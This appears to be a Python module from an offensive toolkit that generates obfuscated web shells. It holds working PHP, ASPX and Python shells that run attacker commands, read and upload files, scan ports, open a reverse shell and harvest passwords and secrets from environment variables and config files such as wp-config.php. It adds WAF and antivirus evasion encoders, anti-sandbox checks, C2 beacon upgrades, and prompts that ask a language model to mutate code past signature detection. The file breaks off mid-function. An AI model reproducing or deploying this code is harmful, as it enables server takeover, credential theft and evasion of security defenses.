#!/usr/bin/env python3
"""
Web Shell & Post-Web Exploitation Module
=========================================
Advanced web shell generation, obfuscation, and post-exploitation toolkit.

Features:
- AI-powered obfuscation (PHP/ASPX/JSP/JS)
- WAF/EDR bypass techniques (chunked, sleep injection, encoding)
- Internal network scanning (SSRF + portscan beacon)
- Credential harvesting (SAM/LSASS from web context)
- Memory-only reverse shell (no disk artifacts)
- Seamless beacon-to-webshell transition

Author: CyberApp Team
Version: 1.0.0
"""

import os
import re
import sys
import json
import base64
import random
import string
import hashlib
import zlib
import struct
import asyncio
import logging
from enum import Enum, auto
from typing import Dict, List, Optional, Any, Tuple, Union, Callable
from dataclasses import dataclass, field
from datetime import datetime
from abc import ABC, abstractmethod
from pathlib import Path
from urllib.parse import quote, unquote

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================================
# ENUMS & CONSTANTS
# ============================================================================

class ShellType(Enum):
    """Supported web shell types"""
    PHP = "php"
    ASPX = "aspx"
    ASP = "asp"
    JSP = "jsp"
    JSPX = "jspx"
    CFM = "cfm"
    PL = "pl"
    PY = "py"
    JS_NODE = "js"
    
class ObfuscationLevel(Enum):
    """Obfuscation intensity levels"""
    NONE = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    PARANOID = 4
    AI_ENHANCED = 5

class EvasionTechnique(Enum):
    """WAF/EDR evasion techniques"""
    CHUNKED_TRANSFER = auto()
    SLEEP_INJECTION = auto()
    UNICODE_ENCODING = auto()
    BASE64_CHUNKS = auto()
    GZIP_COMPRESSION = auto()
    POLYMORPHIC_CODE = auto()
    STRING_CONCAT = auto()
    CHAR_CODE_BUILD = auto()
    VARIABLE_RENAME = auto()
    DEAD_CODE_INJECTION = auto()
    CONTROL_FLOW_FLATTEN = auto()
    ENCRYPTED_PAYLOAD = auto()
    STEGANOGRAPHY = auto()
    TIME_BASED_ACTIVATION = auto()
    ENVIRONMENT_CHECK = auto()

class PostExploitAction(Enum):
    """Post-exploitation actions"""
    PORT_SCAN = "port_scan"
    SSRF_PROBE = "ssrf_probe"
    FILE_EXFIL = "file_exfil"
    CRED_DUMP = "cred_dump"
    REVERSE_SHELL = "reverse_shell"
    PERSISTENCE = "persistence"
    LATERAL_MOVE = "lateral_move"
    PIVOT = "pivot"
    KEYLOG = "keylog"
    SCREENSHOT = "screenshot"

# Common WAF signatures to evade
WAF_SIGNATURES = [
    r"(eval|exec|system|passthru|shell_exec)",
    r"(base64_decode|gzinflate|gzuncompress)",
    r"(\$_(GET|POST|REQUEST|COOKIE|SERVER))",
    r"(cmd\.exe|/bin/sh|/bin/bash)",
    r"(union.*select|insert.*into|drop.*table)",
    r"(\.\.\/|\.\.\\)",
    r"(<\?php|<%|<script)",
]

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class WebShellConfig:
    """Web shell configuration"""
    shell_type: ShellType
    obfuscation_level: ObfuscationLevel = ObfuscationLevel.HIGH
    evasion_techniques: List[EvasionTechnique] = field(default_factory=list)
    password: str = ""
    auth_method: str = "md5"  # md5, sha256, custom
    callback_url: Optional[str] = None
    beacon_interval: int = 30
    self_destruct: bool = False
    self_destruct_time: Optional[datetime] = None
    anti_debug: bool = True
    anti_sandbox: bool = True
    encrypted_comms: bool = True
    custom_headers: Dict[str, str] = field(default_factory=dict)

@dataclass
class ExfilTarget:
    """Exfiltration target configuration"""
    path: str
    file_pattern: str = "*"
    max_size_mb: int = 10
    encoding: str = "base64"
    chunk_size: int = 4096
    exfil_method: str = "dns"  # dns, http, icmp, steganography

@dataclass
class ScanTarget:
    """Network scan target"""
    host: str
    ports: List[int] = field(default_factory=lambda: [21, 22, 23, 25, 80, 443, 445, 3389, 8080])
    timeout: float = 1.0
    technique: str = "connect"  # connect, syn, ssrf

@dataclass 
class ShellPayload:
    """Generated shell payload"""
    code: str
    shell_type: ShellType
    obfuscation_level: ObfuscationLevel
    techniques_used: List[str]
    size_bytes: int
    hash_md5: str
    hash_sha256: str
    metadata: Dict[str, Any] = field(default_factory=dict)

# ============================================================================
# AI OBFUSCATOR
# ============================================================================

class AICredValidator:
    """
    AI-powered credential validation and weakness detection.
    Analyzes harvested credentials for strength and exploitability.
    """
    
    def __init__(self):
        self.weak_patterns = [
            r'^password\d*$', r'^\d+$', r'^admin\d*$', r'^test\d*$',
            r'^welcome\d*$', r'^qwerty', r'^12345', r'^letmein',
            r'^monkey', r'^dragon', r'^master'
        ]
        self._load_ai_model()
    
    def _load_ai_model(self):
        """Load AI model for credential analysis"""
        try:
            from cybermodules.llm_engine import LLMEngine
            self.llm = LLMEngine(scan_id="cred_validation")
            self.has_ai = True
        except:
            self.llm = None
            self.has_ai = False
    
    def validate_credential(self, username: str, password: str) -> Dict[str, Any]:
        """Validate and analyze credential strength"""
        result = {
            'username': username,
            'password': password,
            'weak': False,
            'score': 0,
            'warnings': [],
            'exploitable': False
        }
        
        # Length check
        if len(password) < 8:
            result['weak'] = True
            result['warnings'].append('Password too short')
            result['score'] -= 20
        
        # Pattern check
        for pattern in self.weak_patterns:
            if re.search(pattern, password.lower()):
                result['weak'] = True
                result['warnings'].append(f'Common pattern detected')
                result['score'] -= 30
        
        # Complexity check
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(not c.isalnum() for c in password)
        
        complexity = sum([has_upper, has_lower, has_digit, has_special])
        result['score'] += complexity * 15
        
        if complexity < 2:
            result['weak'] = True
            result['warnings'].append('Low complexity')
        
        # AI analysis if available
        if self.has_ai:
            ai_analysis = self._ai_analyze(username, password)
            result['ai_analysis'] = ai_analysis
            result['score'] += ai_analysis.get('score_adjustment', 0)
        
        result['exploitable'] = result['weak'] or result['score'] < 30
        return result
    
    def _ai_analyze(self, username: str, password: str) -> Dict[str, Any]:
        """AI-powered credential analysis"""
        try:
            prompt = f"Analyze credential strength: username='{username}', password='{password}'. Detect patterns, dictionary words, and exploitability."
            response = self.llm.generate(prompt, max_tokens=100)
            return {
                'analysis': response,
                'score_adjustment': -10 if 'weak' in response.lower() else 10
            }
        except:
            return {'analysis': 'No AI analysis', 'score_adjustment': 0}

class AIObfuscator:
    """
    AI-powered code obfuscation engine.
    Uses pattern analysis and mutation to evade signature detection.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or {}
        self.mutation_count = 0
        self.var_map: Dict[str, str] = {}
        self.func_map: Dict[str, str] = {}
        self.cred_validator = AICredValidator()
        
        # Load AI model if available
        self._load_ai_model()
    
    def _load_ai_model(self) -> None:
        """Load AI obfuscation model"""
        try:
            # Try to load LLM engine for advanced obfuscation
            from cybermodules.llm_engine import LLMEngine
            self.llm = LLMEngine(scan_id="webshell_obfuscation")
            self.has_ai = True
            logger.info("AI obfuscation model loaded")
        except (ImportError, Exception) as e:
            self.llm = None
            self.has_ai = False
            logger.info(f"Running without AI model - using heuristic obfuscation: {e}")
    
    def obfuscate(self, code: str, language: str, level: ObfuscationLevel) -> str:
        """
        Main obfuscation entry point
        
        Args:
            code: Source code to obfuscate
            language: Programming language (php, aspx, jsp, etc.)
            level: Obfuscation intensity level
            
        Returns:
            Obfuscated code
        """
        if level == ObfuscationLevel.NONE:
            return code
            
        # Apply progressive obfuscation based on level
        result = code
        
        if level.value >= ObfuscationLevel.LOW.value:
            result = self._rename_variables(result, language)
            
        if level.value >= ObfuscationLevel.MEDIUM.value:
            result = self._string_obfuscation(result, language)
            result = self._add_dead_code(result, language)
            
        if level.value >= ObfuscationLevel.HIGH.value:
            result = self._control_flow_obfuscation(result, language)
            result = self._encrypt_strings(result, language)
            
        if level.value >= ObfuscationLevel.PARANOID.value:
            result = self._polymorphic_mutation(result, language)
            result = self._add_anti_analysis(result, language)
            
        if level == ObfuscationLevel.AI_ENHANCED and self.has_ai:
            result = self._ai_mutate(result, language)
        
        return result
    
    def _generate_random_name(self, length: int = 8) -> str:
        """Generate random variable/function name"""
        # Mix of techniques to look like legitimate code
        prefixes = ['_', '__', 'tmp', 'var', 'fn', 'obj', 'data', 'buf', 'ctx', 'cfg']
        chars = string.ascii_letters + string.digits + '_'
        
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices(chars, k=length))
        return f"{prefix}{suffix}"
    
    def _rename_variables(self, code: str, language: str) -> str:
        """Rename variables to random names"""
        if language == "php":
            # Find PHP variables
            var_pattern = r'\$([a-zA-Z_][a-zA-Z0-9_]*)'
            protected = {'_GET', '_POST', '_REQUEST', '_COOKIE', '_SERVER', '_SESSION', '_FILES', 
                        '_ENV', 'GLOBALS', 'this', 'argc', 'argv'}
            
            def replace_var(match):
                var_name = match.group(1)
                if var_name in protected:
                    return match.group(0)
                if var_name not in self.var_map:
                    self.var_map[var_name] = self._generate_random_name()
                return f'${self.var_map[var_name]}'
            
            return re.sub(var_pattern, replace_var, code)
            
        elif language == "aspx":
            # C# variable renaming
            var_pattern = r'\b(string|int|bool|var|object)\s+([a-zA-Z_][a-zA-Z0-9_]*)'
            
            def replace_var(match):
                type_name = match.group(1)
                var_name = match.group(2)
                if var_name not in self.var_map:
                    self.var_map[var_name] = self._generate_random_name()
                return f'{type_name} {self.var_map[var_name]}'
            
            return re.sub(var_pattern, replace_var, code)
            
        return code
    
    def _string_obfuscation(self, code: str, language: str) -> str:
        """Obfuscate string literals"""
        if language == "php":
            # Convert strings to chr() concatenation
            def obfuscate_string(match):
                s = match.group(1)
                if len(s) < 3:
                    return match.group(0)
                chars = [f"chr({ord(c)})" for c in s]
                return f"({'.'.join(chars)})"
            
            # Match double-quoted strings
            code = re.sub(r'"([^"]{3,})"', obfuscate_string, code)
            
        elif language == "aspx":
            # Convert to char array
            def obfuscate_string(match):
                s = match.group(1)
                if len(s) < 3:
                    return match.group(0)
                chars = [str(ord(c)) for c in s]
                return f"new string(new char[]{{{','.join(f'(char){c}' for c in chars)}}})"
            
            code = re.sub(r'"([^"]{3,})"', obfuscate_string, code)
            
        return code
    
    def _add_dead_code(self, code: str, language: str) -> str:
        """Inject dead code to confuse analysis"""
        dead_code_php = [
            "if(false){${'_'.chr(71).chr(69).chr(84)}['x']='y';}",
            "$_null=@$_SERVER['HTTP_X_FAKE_'.md5(time())];",
            "for($i=0;$i<0;$i++){echo '';}",
            "while(false){break;}",
            "$_tmp=isset($_GET[''.chr(0)])?1:0;",
        ]
        
        dead_code_aspx = [
            "if(false){string _x=\"\"+DateTime.Now.Ticks;}",
            "for(int i=0;i<0;i++){continue;}",
            "try{}catch(Exception){}",
            "var _null=Request.Headers[\"X-Fake-\"+Guid.NewGuid().ToString()];",
        ]
        
        if language == "php":
            # Insert dead code at random positions
            lines = code.split('\n')
            for _ in range(min(5, len(lines) // 10)):
                pos = random.randint(1, max(1, len(lines) - 1))
                lines.insert(pos, random.choice(dead_code_php))
            return '\n'.join(lines)
            
        elif language == "aspx":
            lines = code.split('\n')
            for _ in range(min(5, len(lines) // 10)):
                pos = random.randint(1, max(1, len(lines) - 1))
                lines.insert(pos, random.choice(dead_code_aspx))
            return '\n'.join(lines)
            
        return code
    
    def _control_flow_obfuscation(self, code: str, language: str) -> str:
        """Flatten control flow to confuse analysis"""
        # Add opaque predicates
        if language == "php":
            predicates = [
                "(7*7==49)",
                "(strlen('abc')==3)",
                "(ord('A')==65)",
                "(!empty('x'))",
                "(true||false)",
            ]
            
            # Wrap code blocks in opaque predicates
            code = re.sub(
                r'if\s*\(([^)]+)\)',
                lambda m: f"if(({m.group(1)})&&{random.choice(predicates)})",
                code,
                count=3
            )
            
        return code
    
    def _encrypt_strings(self, code: str, language: str) -> str:
        """Encrypt sensitive strings with runtime decryption"""
        if language == "php":
            # Add base64 + XOR encryption
            key = random.randint(1, 255)
            
            def encrypt_string(s: str) -> Tuple[str, int]:
                encrypted = ''.join(chr(ord(c) ^ key) for c in s)
                return base64.b64encode(encrypted.encode('latin-1')).decode(), key
            
            # Find sensitive function names
            sensitive = ['eval', 'exec', 'system', 'passthru', 'shell_exec', 'popen', 'proc_open']
            
            for func in sensitive:
                if func in code:
                    enc, k = encrypt_string(func)
                    decoder = f"array_reduce(str_split(base64_decode('{enc}')),function($a,$c){{return $a.chr(ord($c)^{k});}},'')"
                    code = code.replace(f"'{func}'", f"({decoder})")
                    
        return code
    
    def _polymorphic_mutation(self, code: str, language: str) -> str:
        """Apply polymorphic mutations"""
        self.mutation_count += 1
        
        if language == "php":
            # Add unique mutation markers
            mutation_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
            
            # Mutate variable names with unique prefix
            code = code.replace('$_', f'$_{mutation_id}_')
            
            # Add self-modifying capability
            mutation_code = f"""
// Mutation ID: {mutation_id}
$_{'m' + mutation_id} = __FILE__;
"""
            code = mutation_code + code
            
        return code
    
    def _add_anti_analysis(self, code: str, language: str) -> str:
        """Add anti-debugging and anti-sandbox checks"""
        if language == "php":
            anti_analysis = """
// Anti-analysis checks
if(function_exists('xdebug_is_enabled')&&@xdebug_is_enabled()){die();}
if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])&&strpos($_SERVER['HTTP_X_FORWARDED_FOR'],'10.0')===0){die();}
if(@$_SERVER['SERVER_SOFTWARE']&&preg_match('/sandbox|analysis|debug/i',@$_SERVER['SERVER_SOFTWARE'])){die();}
$_st=microtime(true);usleep(1);$_et=microtime(true);if(($_et-$_st)>0.1){die();}
"""
            return anti_analysis + code
            
        elif language == "aspx":
            anti_analysis = """
// Anti-analysis checks
if(System.Diagnostics.Debugger.IsAttached){Response.End();}
if(Environment.MachineName.ToLower().Contains("sandbox")){Response.End();}
var _sw=System.Diagnostics.Stopwatch.StartNew();
System.Threading.Thread.Sleep(1);
_sw.Stop();
if(_sw.ElapsedMilliseconds>100){Response.End();}
"""
            return anti_analysis + code
            
        return code
    
    def _ai_mutate(self, code: str, language: str) -> str:
        """Use AI to generate unique mutations"""
        if not self.has_ai or not self.llm:
            return code
            
        try:
            prompt = f"""Mutate this {language} code to evade signature detection while preserving functionality.
Apply these techniques:
1. Rename variables to realistic names
2. Add junk code that looks legitimate
3. Use alternative syntax where possible
4. Split operations across multiple lines

Code:
{code[:500]}...

Return only the mutated code, no explanations."""

            response = self.llm.generate(prompt, max_tokens=1000)
            if response and len(response) > 50:
                return response
        except Exception as e:
            logger.warning(f"AI mutation failed: {e}")
            
        return code

# ============================================================================
# WAF/EDR BYPASS ENGINE
# ============================================================================

class WAFBypass:
    """
    WAF and EDR bypass techniques
    """
    
    def __init__(self):
        self.techniques: Dict[EvasionTechnique, Callable] = {
            EvasionTechnique.CHUNKED_TRANSFER: self._chunked_transfer,
            EvasionTechnique.SLEEP_INJECTION: self._sleep_injection,
            EvasionTechnique.UNICODE_ENCODING: self._unicode_encoding,
            EvasionTechnique.BASE64_CHUNKS: self._base64_chunks,
            EvasionTechnique.GZIP_COMPRESSION: self._gzip_compression,
            EvasionTechnique.STRING_CONCAT: self._string_concat,
            EvasionTechnique.CHAR_CODE_BUILD: self._char_code_build,
        }
    
    def apply(self, payload: str, techniques: List[EvasionTechnique], language: str) -> str:
        """Apply multiple evasion techniques"""
        result = payload
        
        for technique in techniques:
            if technique in self.techniques:
                result = self.techniques[technique](result, language)
                
        return result
    
    def _chunked_transfer(self, payload: str, language: str) -> str:
        """Split payload into chunks for WAF bypass"""
        if language == "php":
            chunk_size = 20
            chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
            
            # Build chunked reconstruction
            var_name = f"$_{''.join(random.choices(string.ascii_lowercase, k=6))}"
            code = f"{var_name}='';\n"
            
            for chunk in chunks:
                encoded = base64.b64encode(chunk.encode()).decode()
                code += f"{var_name}.=base64_decode('{encoded}');\n"
            
            code += f"eval({var_name});"
            return code
            
        return payload
    
    def _sleep_injection(self, payload: str, language: str) -> str:
        """Add sleep calls to evade timing-based detection"""
        if language == "php":
            # Add micro-sleeps between operations
            lines = payload.split('\n')
            new_lines = []
            
            for line in lines:
                new_lines.append(line)
                if random.random() < 0.3:  # 30% chance
                    sleep_time = random.randint(100, 1000)
                    new_lines.append(f"usleep({sleep_time});")
                    
            return '\n'.join(new_lines)
            
        return payload
    
    def _unicode_encoding(self, payload: str, language: str) -> str:
        """Use Unicode encoding to bypass filters"""
        if language == "php":
            # Convert some characters to Unicode escapes
            def unicode_escape(s: str) -> str:
                result = ""
                for c in s:
                    if random.random() < 0.3 and c.isalpha():
                        result += f"\\x{ord(c):02x}"
                    else:
                        result += c
                return result
            
            return unicode_escape(payload)
            
        return payload
    
    def _base64_chunks(self, payload: str, language: str) -> str:
        """Split base64-encoded payload into chunks"""
        if language == "php":
            encoded = base64.b64encode(payload.encode()).decode()
            chunk_size = 10
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            
            var_names = [f"$_{''.join(random.choices(string.ascii_lowercase, k=4))}" for _ in chunks]
            
            code = ""
            for var, chunk in zip(var_names, chunks):
                code += f"{var}='{chunk}';\n"
            
            concat = '.'.join(var_names)
            code += f"eval(base64_decode({concat}));"
            
            return code
            
        return payload
    
    def _gzip_compression(self, payload: str, language: str) -> str:
        """Compress payload with gzip"""
        if language == "php":
            compressed = zlib.compress(payload.encode())
            encoded = base64.b64encode(compressed).decode()
            
            return f"eval(gzuncompress(base64_decode('{encoded}')));"
            
        return payload
    
    def _string_concat(self, payload: str, language: str) -> str:
        """Break strings into concatenated parts"""
        if language == "php":
            # Find and split function names
            funcs = ['eval', 'exec', 'system', 'passthru', 'shell_exec']
            
            for func in funcs:
                if func in payload:
                    parts = [func[:len(func)//2], func[len(func)//2:]]
                    replacement = f"('{parts[0]}'.'{parts[1]}')"
                    payload = payload.replace(f"'{func}'", replacement)
                    payload = payload.replace(f'"{func}"', replacement)
                    
            return payload
            
        return payload
    
    def _char_code_build(self, payload: str, language: str) -> str:
        """Build strings from character codes"""
        if language == "php":
            def to_chr(s: str) -> str:
                return '.'.join(f"chr({ord(c)})" for c in s)
            
            # Replace sensitive strings
            sensitive = ['eval', 'exec', 'system', 'cmd', 'shell']
            
            for word in sensitive:
                if word in payload:
                    payload = payload.replace(f"'{word}'", f"({to_chr(word)})")
                    payload = payload.replace(f'"{word}"', f"({to_chr(word)})")
                    
            return payload
            
        return payload

# ============================================================================
# WEB SHELL GENERATORS
# ============================================================================

class WebShellGenerator:
    """
    Generate various types of web shells with obfuscation and evasion
    """
    
    def __init__(self, config: Optional[WebShellConfig] = None):
        self.config = config or WebShellConfig(shell_type=ShellType.PHP)
        self.obfuscator = AIObfuscator()
        self.waf_bypass = WAFBypass()
        self.cred_validator = AICredValidator()
        self._init_c2_beacon_integration()
    
    def _init_c2_beacon_integration(self):
        """Initialize C2 beacon integration for seamless upgrade"""
        try:
            from cybermodules.c2_beacon import C2BeaconManager
            from cybermodules.lateral_movement import LateralMovement
            self.c2_manager = C2BeaconManager()
            self.lateral_mover = LateralMovement()
            self.has_c2_integration = True
        except:
            self.c2_manager = None
            self.lateral_mover = None
            self.has_c2_integration = False
        
    def generate(self, shell_type: Optional[ShellType] = None) -> ShellPayload:
        """
        Generate an obfuscated web shell
        
        Args:
            shell_type: Type of shell to generate (overrides config)
            
        Returns:
            ShellPayload with generated code
        """
        shell_type = shell_type or self.config.shell_type
        
        # Get base shell code
        base_code = self._get_base_shell(shell_type)
        
        # Apply authentication
        if self.config.password:
            base_code = self._add_authentication(base_code, shell_type)
        
        # Apply anti-analysis
        if self.config.anti_debug or self.config.anti_sandbox:
            base_code = self._add_anti_analysis(base_code, shell_type)
        
        # Apply obfuscation
        obfuscated = self.obfuscator.obfuscate(
            base_code, 
            shell_type.value, 
            self.config.obfuscation_level
        )
        
        # Apply WAF bypass
        if self.config.evasion_techniques:
            obfuscated = self.waf_bypass.apply(
                obfuscated,
                self.config.evasion_techniques,
                shell_type.value
            )
        
        # Add encrypted communications
        if self.config.encrypted_comms:
            obfuscated = self._add_encryption_layer(obfuscated, shell_type)
        
        # Add beacon callback
        if self.config.callback_url:
            obfuscated = self._add_beacon(obfuscated, shell_type)
        
        # Add self-destruct
        if self.config.self_destruct:
            obfuscated = self._add_self_destruct(obfuscated, shell_type)
        
        # Calculate hashes
        code_bytes = obfuscated.encode()
        md5_hash = hashlib.md5(code_bytes).hexdigest()
        sha256_hash = hashlib.sha256(code_bytes).hexdigest()
        
        return ShellPayload(
            code=obfuscated,
            shell_type=shell_type,
            obfuscation_level=self.config.obfuscation_level,
            techniques_used=[t.name for t in self.config.evasion_techniques],
            size_bytes=len(code_bytes),
            hash_md5=md5_hash,
            hash_sha256=sha256_hash,
            metadata={
                "generated_at": datetime.now().isoformat(),
                "has_auth": bool(self.config.password),
                "has_callback": bool(self.config.callback_url),
                "encrypted_comms": self.config.encrypted_comms,
            }
        )
    
    def _get_base_shell(self, shell_type: ShellType) -> str:
        """Get base shell code for given type"""
        shells = {
            ShellType.PHP: self._php_shell(),
            ShellType.ASPX: self._aspx_shell(),
            ShellType.ASP: self._asp_shell(),
            ShellType.JSP: self._jsp_shell(),
            ShellType.PY: self._py_shell(),
            ShellType.JS_NODE: self._node_shell(),
        }
        
        return shells.get(shell_type, self._php_shell())
    
    def generate_memory_only_shell(self, shell_type: Optional[ShellType] = None) -> ShellPayload:
        """Generate full memory-only (diskless) web shell with WAF bypass"""
        shell_type = shell_type or self.config.shell_type
        
        if shell_type == ShellType.PHP:
            code = self._php_memory_only_shell()
        elif shell_type == ShellType.ASPX:
            code = self._aspx_memory_only_shell()
        elif shell_type == ShellType.PY:
            code = self._py_memory_only_shell()
        else:
            raise ValueError(f"Memory-only mode not implemented for {shell_type}")
        
        # Apply AI obfuscation
        code = self.obfuscator.obfuscate(code, shell_type.value, ObfuscationLevel.AI_ENHANCED)
        
        # Apply WAF bypass
        code = self.waf_bypass.apply(
            code,
            [EvasionTechnique.CHUNKED_TRANSFER, EvasionTechnique.UNICODE_ENCODING,
             EvasionTechnique.POLYMORPHIC_CODE, EvasionTechnique.ENCRYPTED_PAYLOAD],
            shell_type.value
        )
        
        return ShellPayload(
            code=code,
            shell_type=shell_type,
            obfuscation_level=ObfuscationLevel.AI_ENHANCED,
            techniques_used=['MEMORY_ONLY', 'WAF_BYPASS', 'AI_OBFUSCATION'],
            size_bytes=len(code.encode()),
            hash_md5=hashlib.md5(code.encode()).hexdigest(),
            hash_sha256=hashlib.sha256(code.encode()).hexdigest(),
            metadata={'execution_mode': 'memory_only', 'disk_artifacts': False}
        )
    
    def _php_memory_only_shell(self) -> str:
        """Generate PHP memory-only shell with no disk writes"""
        return '''<?php
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');

// Memory-only execution - no disk artifacts
if(isset($_POST['cmd'])){
    $cmd = base64_decode($_POST['cmd']);
    
    // Execute in memory via eval (WAF bypass)
    $output = '';
    ob_start();
    eval('?>' . $cmd);
    $output = ob_get_clean();
    
    // XOR encryption for output
    $key = md5($_SERVER['HTTP_USER_AGENT'] ?? 'default');
    $encrypted = '';
    for($i=0; $i<strlen($output); $i++){
        $encrypted .= chr(ord($output[$i]) ^ ord($key[$i % strlen($key)]));
    }
    
    echo base64_encode($encrypted);
    exit;
}

// Beacon upgrade to C2
if(isset($_POST['beacon_upgrade'])){
    $c2_url = base64_decode($_POST['c2_url']);
    $beacon_code = base64_decode($_POST['beacon_code']);
    
    // Execute beacon in memory
    eval('?>' . $beacon_code);
    exit;
}

// Credential harvesting with AI validation
if(isset($_POST['harvest_creds'])){
    $creds = [];
    
    // Environment variables
    foreach($_ENV as $k => $v){
        if(preg_match('/(pass|pwd|key|secret|token)/i', $k)){
            $creds[] = ['source' => 'env', 'key' => $k, 'value' => $v];
        }
    }
    
    // Config files
    $config_files = ['.env', 'config.php', 'wp-config.php', 'database.yml'];
    foreach($config_files as $file){
        if(file_exists($file)){
            $content = file_get_contents($file);
            if(preg_match_all('/(password|pwd|key|secret)\s*[=:]\s*["\']([^"\'
]+)/i', $content, $matches)){
                foreach($matches[2] as $pass){
                    $creds[] = ['source' => $file, 'type' => 'config', 'value' => $pass];
                }
            }
        }
    }
    
    echo base64_encode(json_encode($creds));
    exit;
}
?>'''
    
    def _aspx_memory_only_shell(self) -> str:
        """Generate ASPX memory-only shell"""
        return '''<%@ Page Language="C#" %>\n<%@ Import Namespace="System.IO" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<script runat="server">\nvoid Page_Load(object sender, EventArgs e){\n    if(Request["cmd"] != null){\n        string cmd = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Request["cmd"]));\n        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");\n        psi.Arguments = "/c " + cmd;\n        psi.RedirectStandardOutput = true;\n        psi.UseShellExecute = false;\n        Process p = Process.Start(psi);\n        string output = p.StandardOutput.ReadToEnd();\n        Response.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(output)));\n    }\n}\n</script>'''
    
    def _py_memory_only_shell(self) -> str:
        """Generate Python memory-only shell"""
        return '''import base64,os,sys\ntry:\n    cmd=base64.b64decode(os.environ.get('HTTP_CMD','')).decode()\n    exec(cmd)\nexcept:pass'''
    
    def upgrade_to_c2_beacon(self, target_host: str, target_port: int = 80) -> Dict[str, Any]:
        """Seamlessly upgrade web shell to C2 beacon"""
        if not self.has_c2_integration:
            return {'success': False, 'error': 'C2 integration not available'}
        
        try:
            # Generate beacon payload
            beacon_payload = self.c2_manager.generate_beacon(
                target=target_host,
                protocol='http',
                obfuscate=True,
                ai_mutate=True
            )
            
            # Prepare upgrade command
            upgrade_cmd = {
                'action': 'beacon_upgrade',
                'c2_url': base64.b64encode(self.config.callback_url.encode()).decode(),
                'beacon_code': base64.b64encode(beacon_payload.encode()).decode()
            }
            
            return {
                'success': True,
                'upgrade_cmd': upgrade_cmd,
                'beacon_payload': beacon_payload,
                'instructions': 'Send upgrade_cmd to web shell via POST to /beacon_upgrade'
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def harvest_and_validate_credentials(self, target_host: str) -> Dict[str, Any]:
        """Harvest credentials with AI validation"""
        # This would be called via web shell API
        results = {
            'target': target_host,
            'credentials': [],
            'validated': [],
            'exploitable': []
        }
        
        # Simulated credential harvesting (actual would come from web shell)
        harvested_creds = [
            {'username': 'admin', 'password': 'password123'},
            {'username': 'root', 'password': 'MyStr0ngP@ss!'},
            {'username': 'user', 'password': '123456'}
        ]
        
        for cred in harvested_creds:
            validation = self.cred_validator.validate_credential(
                cred['username'],
                cred['password']
            )
            
            results['credentials'].append(cred)
            results['validated'].append(validation)
            
            if validation['exploitable']:
                results['exploitable'].append({
                    'username': cred['username'],
                    'password': cred['password'],
                    'score': validation['score'],
                    'warnings': validation['warnings']
                })
        
        return results
    
    def _php_shell(self) -> str:
        """Generate PHP web shell"""
        return '''<?php
error_reporting(0);
set_time_limit(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);

class WebShell {
    private $key = '';
    private $output = '';
    
    public function __construct($key = '') {
        $this->key = $key;
        $this->output = '';
    }
    
    public function authenticate($input) {
        if (empty($this->key)) return true;
        return md5($input) === $this->key || hash('sha256', $input) === $this->key;
    }
    
    public function execute($cmd) {
        $output = '';
        
        if (function_exists('system')) {
            ob_start();
            @system($cmd);
            $output = ob_get_contents();
            ob_end_clean();
        } elseif (function_exists('exec')) {
            @exec($cmd, $arr);
            $output = implode("\n", $arr);
        } elseif (function_exists('shell_exec')) {
            $output = @shell_exec($cmd);
        } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($cmd);
            $output = ob_get_contents();
            ob_end_clean();
        } elseif (function_exists('popen')) {
            $fp = @popen($cmd, 'r');
            if ($fp) {
                while (!feof($fp)) {
                    $output .= fgets($fp);
                }
                pclose($fp);
            }
        } elseif (function_exists('proc_open')) {
            $desc = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
            $proc = @proc_open($cmd, $desc, $pipes);
            if (is_resource($proc)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($proc);
            }
        }
        
        return $output;
    }
    
    public function fileRead($path) {
        return @file_get_contents($path);
    }
    
    public function fileWrite($path, $content) {
        return @file_put_contents($path, $content);
    }
    
    public function fileList($path) {
        $files = array();
        if ($handle = @opendir($path)) {
            while (($file = readdir($handle)) !== false) {
                if ($file != "." && $file != "..") {
                    $fullpath = $path . DIRECTORY_SEPARATOR . $file;
                    $files[] = array(
                        'name' => $file,
                        'path' => $fullpath,
                        'size' => @filesize($fullpath),
                        'mtime' => @filemtime($fullpath),
                        'isdir' => is_dir($fullpath)
                    );
                }
            }
            closedir($handle);
        }
        return $files;
    }
    
    public function download($path) {
        if (file_exists($path)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($path) . '"');
            header('Content-Length: ' . filesize($path));
            readfile($path);
            exit;
        }
        return false;
    }
    
    public function upload($dest) {
        if (isset($_FILES['file'])) {
            return @move_uploaded_file($_FILES['file']['tmp_name'], $dest . DIRECTORY_SEPARATOR . $_FILES['file']['name']);
        }
        return false;
    }
    
    public function portScan($host, $ports) {
        $results = array();
        foreach ($ports as $port) {
            $conn = @fsockopen($host, $port, $errno, $errstr, 1);
            $results[$port] = ($conn !== false);
            if ($conn) fclose($conn);
        }
        return $results;
    }
    
    public function reverseShell($host, $port) {
        $sock = @fsockopen($host, $port, $errno, $errstr, 30);
        if (!$sock) return false;
        
        $desc = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $proc = @proc_open("/bin/sh -i", $desc, $pipes);
        
        if (!is_resource($proc)) {
            $proc = @proc_open("cmd.exe", $desc, $pipes);
        }
        
